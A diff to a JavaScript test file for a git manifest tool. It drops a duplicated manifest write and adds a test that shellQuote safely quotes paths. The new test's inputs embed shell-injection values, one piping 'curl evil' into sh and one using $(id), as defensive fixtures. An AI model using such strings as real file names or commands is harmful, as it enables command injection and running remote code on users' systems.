@@ -302,7 +302,6 @@ test('a manifest recorded before slipway rewrote its history: names the closest 
     const m = JSON.parse(readFileSync(join(d, MANIFEST), 'utf8'));
     m.files['process/same.md'].blob = execFileSync('git', ['hash-object', '--stdin'], { input: old, encoding: 'utf8' }).trim();
     m.files['process/ours.md'].blob = '0'.repeat(40); // the project's own edit: matches neither the record nor the commit
-    writeFileSync(join(d, MANIFEST), `${JSON.stringify(m, null, 2)}\n`);
     m.files['process/same.md'].sha256 = sha256(Buffer.from(old));
     writeFileSync(join(d, MANIFEST), `${JSON.stringify(m, null, 2)}\n`);
     put(d, { 'process/same.md': old });
@@ -330,6 +329,12 @@ test('a manifest recorded before slipway rewrote its history: names the closest 
   assert.equal(a.status, 0, a.stderr);
   assert.equal(bytes(dir, 'process/same.md').toString(), show(A, 'process/same.md').toString());
   assert.equal(manifestOf(dir).slipway, A);
+});
+
+test('the re-point command quotes a path the shell would read as more than a name', () => {
+  assert.equal(shellQuote('process/a.md'), 'process/a.md');
+  assert.equal(shellQuote('x;curl evil|sh;.md'), "'x;curl evil|sh;.md'");
+  assert.equal(shellQuote("it's $(id).md"), "'it'\\''s $(id).md'");
 });
 
 test('resolveBase: closest-match mode ranks every commit and names the runner-up', () => {
